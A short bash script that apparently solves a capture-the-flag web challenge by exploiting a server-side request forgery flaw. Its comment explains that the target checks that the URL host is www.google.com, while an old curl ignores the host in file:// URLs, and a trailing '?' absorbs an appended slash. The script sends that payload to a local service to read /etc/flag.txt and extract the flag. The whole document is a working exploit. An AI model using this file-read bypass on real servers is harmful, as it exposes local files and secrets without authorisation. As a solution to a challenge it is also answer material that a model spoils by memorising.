#!/bin/bash
# SSRF: parse_url host must equal www.google.com, but curl (jessie 7.38) ignores
# the host for file:// URLs. The trailing "?" turns the appended "/" into a query
# so file://www.google.com/etc/flag.txt is read.
HOST="${URL:-${1:-http://127.0.0.1:18303}}"
curl -s "$HOST/?site=file://www.google.com/etc/flag.txt?" | grep -o 'sun{[^}]*}' | head -1
